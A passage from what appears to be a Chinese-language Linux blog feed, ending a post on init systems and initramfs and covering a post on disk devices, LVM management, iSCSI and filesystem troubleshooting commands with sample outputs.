<p><strong>System V init</strong>: 存在一个启动序列，同一时间只能启动一个任务，这种架构下，很容易解决依赖问题，但是性能方面要受一些影响。<br><strong>systemd is goal oriented.</strong> : 针对System V init的不足，systemd所有的服务都并发启动。systemd时基于目标的，需要定义要实现的目标，以及它的依赖项。systemd 将所有过程都抽象为一个配置单元，即 unit。可以认为一个服务是一个配置单元；一个挂载点是一个配置单元。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux_kernel_systemd_UnitTree.png" alt="systemd Unit target Tree"></p>
<p><strong>Upstart is reactionary.</strong>:Upstart是基于事件的，Upstart的事件驱动模型允许它以异步方式对生成的事件作出回应。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux_kernel_systemd_upstart_sysV.png" alt="System V init Vs UpStart Vs Systemd"></p>
<h2 id="The-Initial-RAM-filesystem"><a href="#The-Initial-RAM-filesystem" class="headerlink" title="The Initial RAM filesystem"></a>The Initial RAM filesystem</h2><p>Linux内核不能通过访问PC BIOS 或者 EFI接口从磁盘获取数据，所以为了mount它的root filesystem, 对于底层存储需要驱动程序支持。解决方案是在内核运行之前，由boot loader加载驱动模块及工具到内存。在启动时，内核读取相关模块到一个临时的RAM filesystem(initramfs),挂载在／根目录,initramsfs允许内核为真正的root filesystem加载必要的驱动模块。<br>最后，再挂载真正的root filesystem、启动init。</p>
<p>Linux在很多场景下都需要创建一个基于内存的文件系统，提供一个可以接近零延迟的快速存储区域。目前有两类主要的RAM磁盘可用，她们个有优劣：ramfs和tmpfs。(注意：创建之前可以使用 <strong>free</strong> 命令查看未使用的RAM)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># mkdir /mnt/ramdisk</span></span><br><span class="line"><span class="meta"># mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk</span></span><br><span class="line"><span class="meta"># vi /etc/fstab</span></span><br><span class="line"><span class="meta">#tmpfs       /mnt/ramdisk tmpfs   nodev,nosuid,noexec,nodiratime,size=1024M   0 0</span></span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works:Device and FileSystem</title>
    <url>/2018/06/07/Linux-Works-FileSystem/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>BASIC Command</li>
<li>LVM</li>
<li>iSCSI</li>
</ul>
<span id="more"></span>
<blockquote>
<p>传统的计算机，其工作的原理都是冯·诺依曼体系：机器里面有一个很大的存储器，用来储存所有的信息，还有一个中央区域，执行简单的计算。我们从存储器的这个地方提取一个数据，又从存储器的另一个地方提取一个数据，把这两个数据送到中央算术单元进行相加，然后把计算结果传送到存储器的另一个地方。这样来看，计算机有一个高效运转的中央处理器，工作十分卖力，速度也很快。</p>
<p>相比之下，整个存储器从头到尾待在一旁，很清闲，就像是一个卡片档案柜，除了偶尔翻找几张卡片，档案柜大多数时间都闲置着。显然，如果有更多的处理器同时工作的话，我们的计算速度就能更快一些。问题是当你使用这个处理器时，可能要用到存储器的某个信息，而同时另一个处理器也需要这个信息，机器就会陷入一片混乱中。出于这些原因，大家普遍认为让很多处理器同时工作是个难题。 — 理查德·费曼. 发现的乐趣 (未读·探索家) (Kindle 位置 470-472).</p>
</blockquote>
<h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><ul>
<li>lsblk</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">NAME                                 MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda                                    8:0    0 1000G  0 disk</span><br><span class="line">|-sda1                                 8:1    0  500M  0 part /boot</span><br><span class="line">|-sda2                                 8:2    0 19.5G  0 part</span><br><span class="line">| |-vg_nwtest68-lv_root (dm-0)       253:0    0 47.5G  0 lvm  /</span><br><span class="line">| `-vg_nwtest68-lv_swap (dm-1)       253:1    0    2G  0 lvm  [SWAP]</span><br><span class="line">`-sda3                                 8:3    0  980G  0 part</span><br><span class="line">  |-vg_nwtest68-lv_root (dm-0)       253:0    0 47.5G  0 lvm  /</span><br><span class="line">  |-vg_nwtest68-lv_data (dm-2)     253:2    0  100G  0 lvm  /data</span><br><span class="line">sr0                                   11:0    1  3.6G  0 rom  /media/RHEL-6.8 Server.x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>fdisk</li>
</ul>
<p>The fdisk command below will print the partition table of all mounted block devices.<a href="https://www.tecmint.com/fdisk-commands-to-manage-linux-disk-partitions/">&gt;&gt;&gt;&gt;&gt; More details &lt;&lt;&lt;&lt;&lt;</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo fdisk -l</span><br><span class="line">[root@NW-DD-APP ~]<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 1073.7 GB, 1073741824000 bytes</span><br><span class="line">255 heads, 63 sectors/track, 130541 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x0008ca86</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *           1          64      512000   83  Linux</span><br><span class="line">Partition 1 does not end on cylinder boundary.</span><br><span class="line">/dev/sda2              64        2611    20458496   8e  Linux LVM</span><br><span class="line">/dev/sda3            2611      130541  1027599062+  83  Linux</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_root: 51.0 GB, 51011125248 bytes</span><br><span class="line">255 heads, 63 sectors/track, 6201 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_swap: 2147 MB, 2147483648 bytes</span><br><span class="line">255 heads, 63 sectors/track, 261 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_data: 107.4 GB, 107374182400 bytes</span><br><span class="line">255 heads, 63 sectors/track, 13054 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br></pre></td></tr></table></figure>
<ul>
<li><p>sfdisk</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo sfdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 130541 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Units = cylinders of 8225280 bytes, blocks of 1024 bytes, counting from 0</span><br><span class="line"></span><br><span class="line">   Device Boot Start     End   <span class="comment">#cyls    #blocks   Id  System</span></span><br><span class="line">/dev/sda1   *      0+     63-     64-    512000   83  Linux</span><br><span class="line">/dev/sda2         63+   2610-   2547-  20458496   8e  Linux LVM</span><br><span class="line">/dev/sda3       2610+ 130540  127931- 1027599062+  83  Linux</span><br><span class="line">/dev/sda4          0       -       0          0    0  Empty</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_root: 6201 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_swap: 261 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Disk /dev/mapper/vg_nwtest68-lv_data: 13054 cylinders, 255 heads, 63 sectors/track</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>cfdisk</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cfdisk (util-linux-ng 2.17.2)</span><br><span class="line"></span><br><span class="line">    Disk Drive: /dev/sda</span><br><span class="line">Size: 1073741824000 bytes, 1073.7 GB</span><br><span class="line">Heads: 255   Sectors per Track: 63   Cylinders: 130541</span><br><span class="line"></span><br><span class="line">Name                    Flags                 Part Type            FS Type                         [Label]                      Size (MB)</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Pri/Log             Free Space                                                        1.05            *</span><br><span class="line">sda1                    Boot                   Primary             Linux ext3                                                      524.29            *</span><br><span class="line">sda2                                           Primary             Linux LVM                                                     20949.50            *</span><br><span class="line">sda3                                           Primary             Linux                                                       1052261.44            *</span><br><span class="line">Pri/Log             Free Space                                                        5.55            *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">  -- create partitions on disk drives (type <span class="number">8</span>e in fdsik)</span><br><span class="line">  -- create physical volumes from the partitions                 </span><br><span class="line">     --&gt; $ sudo pvcreate /dev/sda1</span><br><span class="line">  -- create the volumes group                                     </span><br><span class="line">     --&gt; $ sudo vgcreate -s <span class="number">16</span>m vg /dev/sda1</span><br><span class="line">  -- allocate logical volumes from the volume group               </span><br><span class="line">     --&gt; $ sudo lvcreate -l <span class="number">50</span>g -n mylvm vg</span><br><span class="line">  -- <span class="keyword">format</span> the logical volumes                                   </span><br><span class="line">     --&gt; $ sudo mkfs -t ext4 /dev/vg/mylvm</span><br><span class="line">  -- mount the logical volumes (also update /etc/fstab as needed)</span><br><span class="line">     --&gt; $ <span class="keyword">mkdir</span> /mylvm,</span><br><span class="line"></span><br><span class="line">then --&gt; $ sudo mount /dev/vg/mylvm /mylvm,</span><br><span class="line">then add --&gt; <span class="regexp">/dev/</span>vg/mylvm /mylvm ext4 defaults <span class="number">0</span> <span class="number">0</span>  to the /etc/fstab</span><br></pre></td></tr></table></figure>
<h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/fstab</span><br><span class="line">df -T -h  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看卷组信息</span></span><br><span class="line">vgdisplay</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看逻辑卷信息</span></span><br><span class="line">lvdispaly</span><br><span class="line"></span><br><span class="line"><span class="comment"># lsblk</span></span><br><span class="line">NAME                           MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda                              <span class="number">8</span>:<span class="number">0</span>    <span class="number">0</span>  <span class="number">500</span>G  <span class="number">0</span> disk</span><br><span class="line">├─sda1                           <span class="number">8</span>:<span class="number">1</span>    <span class="number">0</span>  <span class="number">500</span>M  <span class="number">0</span> part /boot</span><br><span class="line">├─sda2                           <span class="number">8</span>:<span class="number">2</span>    <span class="number">0</span> <span class="number">19.5</span>G  <span class="number">0</span> part</span><br><span class="line">│ ├─vg_nwtest68-lv_root (dm-<span class="number">0</span>) <span class="number">253</span>:<span class="number">0</span>    <span class="number">0</span>   <span class="number">35</span>G  <span class="number">0</span> lvm  /</span><br><span class="line">│ └─vg_nwtest68-lv_swap (dm-<span class="number">1</span>) <span class="number">253</span>:<span class="number">1</span>    <span class="number">0</span>    <span class="number">2</span>G  <span class="number">0</span> lvm  [SWAP]</span><br><span class="line">├─sda3                           <span class="number">8</span>:<span class="number">3</span>    <span class="number">0</span>   <span class="number">20</span>G  <span class="number">0</span> part</span><br><span class="line">│ └─vg_nwtest68-lv_root (dm-<span class="number">0</span>) <span class="number">253</span>:<span class="number">0</span>    <span class="number">0</span>   <span class="number">35</span>G  <span class="number">0</span> lvm  /</span><br><span class="line">└─sda4                           <span class="number">8</span>:<span class="number">4</span>    <span class="number">0</span>   <span class="number">10</span>G  <span class="number">0</span> part</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">umount  /home</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除逻辑卷，注意：检查目录是否为空</span></span><br><span class="line"></span><br><span class="line">lvremove  /dev/mapper/VolGroup-lv_home     </span><br></pre></td></tr></table></figure>
<h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在卷组 (name:VolGroup) 上创建逻辑卷</span></span><br><span class="line"></span><br><span class="line">lvcreate -L <span class="number">375</span>GB -n lv_slview VolGroup     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化新建的逻辑卷</span></span><br><span class="line">mkfs.ext4 /dev/mapper/VolGroup-lv_slview</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建挂载点</span></span><br><span class="line"><span class="keyword">mkdir</span> /slview</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line">mount /dev/mapper/VolGroup/lv_slview /slview</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 fstab 重启后自动挂载（风险点）</span></span><br><span class="line">vi /etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># reboot</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fstab 异常处理</span></span><br><span class="line">mount -o remount rw /.</span><br></pre></td></tr></table></figure>
<h4 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fdisk -l</span><br><span class="line"></span><br><span class="line"># df -kh</span><br><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/VolGroup-lv_root</span><br><span class="line">                       <span class="number">35</span>G   <span class="number">23</span>G  <span class="number">9.9</span>G  <span class="number">70</span>% /</span><br><span class="line">tmpfs                 <span class="number">932</span>M  <span class="number">208</span>K  <span class="number">932</span>M   <span class="number">1</span>% /dev/shm</span><br><span class="line">/dev/sda1             <span class="number">477</span>M   <span class="number">41</span>M  <span class="number">411</span>M  <span class="number">10</span>% /boot</span><br><span class="line">/dev/mapper/VolGroup-lv_oradata1</span><br><span class="line">                      <span class="number">2.5</span>G  <span class="number">3.8</span>M  <span class="number">2.4</span>G   <span class="number">1</span>% /oradata1</span><br><span class="line"></span><br><span class="line"># pvs</span><br><span class="line">  PV         VG          Fmt  Attr PSize  PFree</span><br><span class="line">  /dev/sda2  VolGroup lvm2 a--u <span class="number">19.51</span>g    <span class="number">0</span></span><br><span class="line">  /dev/sda3  VolGroup lvm2 a--u <span class="number">19.99</span>g    <span class="number">0</span></span><br><span class="line"></span><br><span class="line"># pvcreate /dev/sda4</span><br><span class="line">  Physical volume <span class="string">&quot;/dev/sda4&quot;</span> successfully created</span><br><span class="line"></span><br><span class="line"># pvs</span><br><span class="line">  PV         VG          Fmt  Attr PSize  PFree</span><br><span class="line">/dev/sda2  VolGroup lvm2 a--u <span class="number">19.51</span>g     <span class="number">0</span></span><br><span class="line">/dev/sda3  VolGroup lvm2 a--u <span class="number">19.99</span>g     <span class="number">0</span></span><br><span class="line">/dev/sda4              lvm2 ---- <span class="number">10.00</span>g <span class="number">10.00</span>g</span><br><span class="line"></span><br><span class="line"># vgdisplay</span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               VolGroup</span><br><span class="line">  ......</span><br><span class="line">  Act PV                <span class="number">2</span></span><br><span class="line">  VG Size               <span class="number">39.50</span> GiB</span><br><span class="line">  PE Size               <span class="number">4.00</span> MiB</span><br><span class="line">  Total PE              <span class="number">10112</span></span><br><span class="line">  Alloc PE / Size       <span class="number">10112</span> / <span class="number">39.50</span> GiB</span><br><span class="line">  Free  PE / Size       <span class="number">0</span> / <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line"># vgextend VolGroup /dev/sda4</span><br><span class="line">  Volume group <span class="string">&quot;VolGroup&quot;</span> successfully extended</span><br><span class="line"></span><br><span class="line"># vgdisplay</span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               VolGroup</span><br><span class="line">  ......</span><br><span class="line">  Act PV                <span class="number">3</span></span><br><span class="line">  VG Size               <span class="number">49.50</span> GiB</span><br><span class="line">  PE Size               <span class="number">4.00</span> MiB</span><br><span class="line">  Total PE              <span class="number">12672</span></span><br><span class="line">  Alloc PE / Size       <span class="number">10112</span> / <span class="number">39.50</span> GiB</span><br><span class="line">  Free  PE / Size       <span class="number">2560</span> / <span class="number">10.00</span> GiB</span><br><span class="line"></span><br><span class="line"># lvextend -L +<span class="number">10</span>GB /dev/mapper/VolGroup-lv_oradata1</span><br><span class="line">Size of logical volume VolGroup/lv_oradata1 changed from <span class="number">2.50</span> GiB (<span class="number">640</span> extents) to <span class="number">12.50</span> GiB (<span class="number">3200</span> extents).</span><br><span class="line">  Logical volume lv_oradata1 successfully resized.</span><br><span class="line"></span><br><span class="line"># vgdisplay</span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               VolGroup</span><br><span class="line">  ......</span><br><span class="line">  Act PV                <span class="number">3</span></span><br><span class="line">  VG Size               <span class="number">49.50</span> GiB</span><br><span class="line">  PE Size               <span class="number">4.00</span> MiB</span><br><span class="line">  Total PE              <span class="number">12672</span></span><br><span class="line">  Alloc PE / Size       <span class="number">12672</span> / <span class="number">49.50</span> GiB</span><br><span class="line">  Free  PE / Size       <span class="number">0</span> / <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line"># resize2fs /dev/mapper/VolGroup-lv_oradata1</span><br><span class="line">resize2fs <span class="number">1.41</span><span class="number">.12</span> (<span class="number">17</span>-May<span class="number">-2010</span>)</span><br><span class="line">Filesystem at /dev/mapper/VolGroup-lv_oradata1 is mounted on /oradata1;</span><br><span class="line">on-line resizing required</span><br><span class="line">old desc_blocks = <span class="number">1</span>, new_desc_blocks = <span class="number">1</span></span><br><span class="line">Performing an on-line resize of /dev/mapper/vg_nwtest68-lv_oradata1 to <span class="number">3276800</span> (<span class="number">4</span>k) blocks.</span><br><span class="line">The filesystem on /dev/mapper/vg_nwtest68-lv_oradata1 is now <span class="number">3276800</span> blocks long.</span><br><span class="line"></span><br><span class="line"># df -kh</span><br><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/VolGroup-lv_root</span><br><span class="line">                       <span class="number">35</span>G   <span class="number">23</span>G  <span class="number">9.9</span>G  <span class="number">70</span>% /</span><br><span class="line">tmpfs                 <span class="number">932</span>M  <span class="number">288</span>K  <span class="number">932</span>M   <span class="number">1</span>% /dev/shm</span><br><span class="line">/dev/sda1             <span class="number">477</span>M   <span class="number">41</span>M  <span class="number">411</span>M  <span class="number">10</span>% /boot</span><br><span class="line">/dev/mapper/VolGroup-lv_oradata1</span><br><span class="line">                       <span class="number">13</span>G  <span class="number">6.3</span>M   <span class="number">12</span>G   <span class="number">1</span>% /oradata1</span><br></pre></td></tr></table></figure>
<h4 id="移除"><a href="#移除" class="headerlink" title="移除"></a>移除</h4><ul>
<li>How to remove missing PV from VG</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vgreduce  --removemissing datavg</span></span><br><span class="line">  WARNING: Device <span class="keyword">for</span> PV fPFkBx-lbnG-R6Zo-3kq5-KOLA-U1ou-LdNIMD not found or rejected by a filter.</span><br><span class="line">  Couldn\<span class="string">&#x27;t find device with uuid fPFkBx-lbnG-R6Zo-3kq5-KOLA-U1ou-LdNIMD.</span></span><br><span class="line"><span class="string">  Wrote out consistent volume group datavg.</span></span><br></pre></td></tr></table></figure>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="SCSI"><a href="#SCSI" class="headerlink" title="SCSI"></a>SCSI</h4><p>小型计算机系统接口（SCSI，Small Computer System Interface）是一种用于计算机及其周边设备之间（硬盘、软驱、光驱、打印机、扫描仪等）系统级接口的独立处理器标准。最大部分的应用是在存储设备上（例如硬盘、磁带机）。</p>
<p>iSCSI（Internet Small Computer System Interface，发音为/ˈаɪskʌzi/），Internet小型计算机系统接口，又称为IP-SAN，是一种基于因特网及SCSI-3协议下的存储技术，由IETF提出，并于2003年2月11日成为正式的标准。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iqn</span></span><br><span class="line">vi /etc/iscsi/initiatorname.iscsi</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找iSCSI目标</span></span><br><span class="line">$ iscsiadm -m discovery -t st -p &lt;组IP地址&gt;:3260</span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">$ iscsiadm -m node -T &lt;完整的目标名称,iqn.xxxxxx&gt; -l -p &lt;组IP&gt;:3260</span><br><span class="line"><span class="comment"># 注销</span></span><br><span class="line">$ iscsiadm -m node -u -T &lt;完整的目标名称&gt;-p &lt;组IP地址&gt;:3260</span><br></pre></td></tr></table></figure>
<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># df -F ufs -o i</span></span><br><span class="line">Filesystem             iused   ifree  %iused  Mounted on</span><br><span class="line">/dev/dsk/c0t0d0s0     190397 6443139     3%   /</span><br><span class="line">/dev/dsk/c0t0d0s4     457204  165964    73%   /var</span><br><span class="line">/dev/dsk/c0t1d0s3      43539 6461869     1%   /slview</span><br><span class="line">/dev/dsk/c0t0d0s3      19745 1226591     2%   /oracle</span><br><span class="line"><span class="comment"># find /var/spool/clientmqueue/ -exec ls &#123;&#125; + |awk &#x27;&#123;print $1&#125;&#x27; | wc -l</span></span><br><span class="line">  866350</span><br><span class="line"><span class="comment"># find /var/spool/clientmqueue/ -exec ls &#123;&#125; + |awk &#x27;&#123;print $1&#125;&#x27; | wc -l^C</span></span><br><span class="line"><span class="comment"># getconf ARG_MAX</span></span><br><span class="line">1048320</span><br></pre></td></tr></table></figure>
<h2 id="Projects"><a href="#Projects" class="headerlink" title="Projects"></a>Projects</h2><ul>
<li><a href="https://github.com/sjqzhang/go-fastdfs">go-fastdfs | 一个简单的分布式文件存储，具有高性能，高可靠，免维护等优点，支持断点续传，分块上传，小文件合并，自动同步，自动修复</a></li>
<li><a href="https://github.com/karrick/godirwalk">Fast directory traversal for Golang</a></li>
<li><a href="https://achainofblocks.com/2018/10/05/ipfs-interplanetary-file-system-simply-explained/">IPFS The Interplanetary File System | Simply Explained</a></li>
</ul>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.tecmint.com/commands-to-collect-system-and-hardware-information-in-linux/">10 Useful Commands to Collect System and Hardware Information in Linux</a></li>
<li><a href="https://opensource.com/article/17/5/introduction-ext4-filesystem">An introduction to Linux’s EXT4 filesystem</a></li>
